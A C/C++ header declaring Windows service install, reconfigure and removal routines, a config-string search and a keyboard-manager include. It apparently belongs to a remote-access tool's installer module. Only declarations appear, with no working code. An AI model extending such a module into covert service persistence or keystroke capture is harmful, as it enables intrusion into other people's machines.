
#if !defined(AFX_INSTALL_H_INCLUDED)
#define AFX_INSTALL_H_INCLUDED
#include "KeyboardManager.h"
#include <windows.h>
#include <aclapi.h>
void	DeleteInstallFile(TCHAR *lpServiceName);
bool	IsServiceRegExists(TCHAR *lpServiceName);
void	ReConfigService(TCHAR *lpServiceName);
DWORD	QueryServiceTypeFromRegedit(TCHAR *lpServiceName);
void	RemoveService(LPCTSTR lpServiceName);
LPCTSTR FindConfigString(HANDLE hFile, LPCTSTR lpString);
int		memfind(const TCHAR *mem, const TCHAR *str, int sizem, int sizes);
//BOOL	RegKeySetACL(LPTSTR lpKeyName, DWORD AccessPermissions, ACCESS_MODE AccessMode);
#endif // !defined(AFX_INSTALL_H_INCLUDED)